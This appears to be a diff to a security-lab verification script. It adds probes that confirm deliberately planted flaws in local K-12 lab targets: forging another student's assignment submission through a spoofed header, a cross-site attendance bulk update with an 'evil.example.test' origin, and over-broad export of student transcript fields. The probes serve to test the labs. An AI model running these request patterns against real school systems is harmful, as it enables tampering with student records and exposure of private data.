@@ -377,6 +377,157 @@ async function probeSisWebhookSignatureBypass() {
   return ["target: k12-sis-webhook-signature-bypass", "sis_webhook_signature_bypass: confirmed"]
 }
 
+async function probeAssignmentSubmissionImpersonation() {
+  const { proc, base } = await startTarget("k12-assignment-submission-impersonation")
+  const health = await fetch(`${base}/health`).then((res) => res.json()) as { ok?: boolean; lab?: string }
+  if (!health.ok || health.lab !== "k12-assignment-submission-impersonation") fail(proc, "health probe failed")
+
+  const baseline = await fetch(`${base}/api/assignments/submission?studentId=student-4402&assignmentId=essay-7`).then(
+    (res) => res.json(),
+  ) as { studentId?: string; text?: string }
+  if (baseline.studentId !== "student-4402" || baseline.text !== "Peer draft") {
+    fail(proc, "assignment baseline probe failed")
+  }
+
+  const submit = await fetch(`${base}/api/assignments/submit`, {
+    method: "POST",
+    headers: { "content-type": "application/json", "x-student-id": "student-4401" },
+    body: JSON.stringify({
+      studentId: "student-4402",
+      assignmentId: "essay-7",
+      text: "forged peer submission",
+    }),
+  }).then((res) => res.json()) as {
+    accepted?: boolean
+    submission?: { studentId?: string; submittedBy?: string; ownershipChecked?: boolean }
+    labFinding?: string
+  }
+  if (
+    !submit.accepted ||
+    submit.submission?.studentId !== "student-4402" ||
+    submit.submission?.submittedBy !== "student-4401" ||
+    submit.submission?.ownershipChecked ||
+    submit.labFinding !== "assignment_submission_impersonation"
+  ) {
+    fail(proc, "assignment submit probe did not confirm cross-student impersonation")
+  }
+
+  const changed = await fetch(`${base}/api/assignments/submission?studentId=student-4402&assignmentId=essay-7`).then(
+    (res) => res.json(),
+  ) as { text?: string; submittedBy?: string }
+  if (changed.text !== "forged peer submission" || changed.submittedBy !== "student-4401") {
+    fail(proc, "assignment target state probe did not confirm forged submission")
+  }
+
+  proc.kill()
+  await proc.exited
+  return ["target: k12-assignment-submission-impersonation", "assignment_submission_impersonation: confirmed"]
+}
+
+async function probeAttendanceBulkUpdateCsrf() {
+  const { proc, base } = await startTarget("k12-attendance-bulk-update-csrf")
+  const health = await fetch(`${base}/health`).then((res) => res.json()) as { ok?: boolean; lab?: string }
+  if (!health.ok || health.lab !== "k12-attendance-bulk-update-csrf") fail(proc, "health probe failed")
+
+  const policy = await fetch(`${base}/api/attendance/csrf-policy`).then((res) => res.json()) as {
+    csrfRequired?: boolean
+    originValidation?: string
+    cookieSameSite?: string
+    labFinding?: string
+  }
+  if (
+    policy.csrfRequired ||
+    policy.originValidation !== "disabled" ||
+    policy.cookieSameSite !== "none" ||
+    policy.labFinding !== "attendance_csrf_controls_missing"
+  ) {
+    fail(proc, "attendance CSRF policy probe did not confirm missing protections")
+  }
+
+  const update = await fetch(`${base}/api/attendance/bulk-update`, {
+    method: "POST",
+    headers: {
+      "content-type": "application/json",
+      origin: "https://evil.example.test",
+      cookie: "teacher_session=synthetic-teacher-session",
+    },
+    body: JSON.stringify({
+      updates: [
+        { studentId: "student-7101", status: "absent", reason: "forged field trip" },
+        { studentId: "student-7102", status: "absent", reason: "forged field trip" },
+      ],
+    }),
+  }).then((res) => res.json()) as {
+    accepted?: boolean
+    updateCount?: number
+    cookieAccepted?: boolean
+    csrfVerified?: boolean
+    labFinding?: string
+  }
+  if (
+    !update.accepted ||
+    update.updateCount !== 2 ||
+    !update.cookieAccepted ||
+    update.csrfVerified ||
+    update.labFinding !== "attendance_bulk_update_csrf"
+  ) {
+    fail(proc, "attendance update probe did not confirm cross-site state change")
+  }
+
+  const records = await fetch(`${base}/api/attendance/records`).then((res) => res.json()) as {
+    records?: Array<{ studentId?: string; status?: string; reason?: string }>
+  }
+  if (!records.records?.every((record) => record.status === "absent" && record.reason === "forged field trip")) {
+    fail(proc, "attendance records probe did not confirm mutation")
+  }
+
+  proc.kill()
+  await proc.exited
+  return ["target: k12-attendance-bulk-update-csrf", "attendance_bulk_update_csrf: confirmed"]
+}
+
+async function probeTranscriptExportOverexposure() {
+  const { proc, base } = await startTarget("k12-transcript-export-overexposure")
+  const health = await fetch(`${base}/health`).then((res) => res.json()) as { ok?: boolean; lab?: string }
+  if (!health.ok || health.lab !== "k12-transcript-export-overexposure") fail(proc, "health probe failed")
+
+  const schema = await fetch(`${base}/api/transcripts/export-schema`).then((res) => res.json()) as {
+    includeAllAdds?: string[]
+    roleRequiredForSensitiveFields?: boolean
+    labFinding?: string
+  }
+  if (
+    !schema.includeAllAdds?.includes("disciplineNote") ||
+    schema.roleRequiredForSensitiveFields ||
+    schema.labFinding !== "transcript_sensitive_field_policy_gap"
+  ) {
+    fail(proc, "transcript schema probe did not confirm sensitive-field policy gap")
+  }
+
+  const exportResult = await fetch(`${base}/api/transcripts/export?studentId=student-8201&include=all`, {
+    headers: { "x-role": "teacher" },
+  }).then((res) => res.json()) as {
+    requesterRole?: string
+    export?: { accommodations?: string; disciplineNote?: string; guardianEmail?: string }
+    sensitiveFieldsReturned?: boolean
+    labFinding?: string
+  }
+  if (
+    exportResult.requesterRole !== "teacher" ||
+    exportResult.export?.accommodations !== "extended testing time" ||
+    exportResult.export?.disciplineNote !== "synthetic counseling referral" ||
+    exportResult.export?.guardianEmail !== "guardian8201@example.test" ||
+    !exportResult.sensitiveFieldsReturned ||
+    exportResult.labFinding !== "transcript_export_overexposure"
+  ) {
+    fail(proc, "transcript export probe did not confirm sensitive-field overexposure")
+  }
+
+  proc.kill()
+  await proc.exited
+  return ["target: k12-transcript-export-overexposure", "transcript_export_overexposure: confirmed"]
+}
+
 const lines = [
   "ulm_lab_target: ok",
   ...(await probeMfaGap()),
@@ -388,6 +539,9 @@ const lines = [
   ...(await probeGuardianInviteTakeover()),
   ...(await probeLtiSharedSecretLeak()),
   ...(await probeSisWebhookSignatureBypass()),
+  ...(await probeAssignmentSubmissionImpersonation()),
+  ...(await probeAttendanceBulkUpdateCsrf()),
+  ...(await probeTranscriptExportOverexposure()),
 ]
 
 console.log(lines.join("\n"))
